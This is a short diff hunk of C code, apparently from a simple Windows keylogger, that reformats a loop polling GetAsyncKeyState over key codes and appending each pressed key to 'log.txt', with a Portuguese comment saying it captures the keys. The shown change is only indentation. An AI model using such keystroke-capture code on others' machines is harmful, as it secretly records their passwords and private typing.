@@ -22,10 +22,10 @@ int main()
 
     for(a=8;a<=190;a++){
       if(GetAsyncKeyState(a) == -32767) // captura as teclas !!
-    salvar(a,"log.txt");
-}
+      salvar(a,"log.txt");
+     }
 
-}
+  }
 
 return 0;
 }
